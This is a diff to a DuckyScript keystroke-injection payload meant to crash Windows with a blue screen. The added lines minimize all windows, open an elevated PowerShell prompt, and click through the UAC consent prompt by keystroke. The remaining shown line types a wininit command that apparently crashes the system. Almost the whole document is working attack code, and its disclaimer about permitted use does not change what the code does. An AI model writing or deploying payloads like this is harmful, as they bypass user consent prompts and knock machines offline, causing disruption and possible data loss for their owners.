@@ -2,6 +2,7 @@ REM ------------------------------------
 REM Description: Trigger BSoD on Windows
 REM Author: P-ict0 (https://github.com/P-ict0)
 REM Date: 11/01/2025
+REM THIS SCRIPT IS INTENDED FOR USE ON SYSTEMS YOU OWN OR HAVE BEEN GIVEN PERMISSION TO USE, I TAKE NO RESPONSIBILITIES FOR ANY MISUSE
 REM ------------------------------------
 REM This script:
 REM 1. Opens an admin powershell terminal
@@ -10,14 +11,19 @@ REM ------------------------------------
 
 DEFAULT_DELAY 100
 
+REM ---------- Minimize everything ----------
+GUI m
+DELAY 200
+
 REM ---------- Open PowerShell as Admin ----------
-GUI x
-DELAY 20
-STRING a
+GUI r
 DELAY 500
+STRING powershell -Command "Start-Process PowerShell -Verb RunAs"
+ENTER
+DELAY 2000
 LEFTARROW
 ENTER
-DELAY 900
+DELAY 1500
 
 REM ---------- Crash windows ----------
 STRING powershell wininit
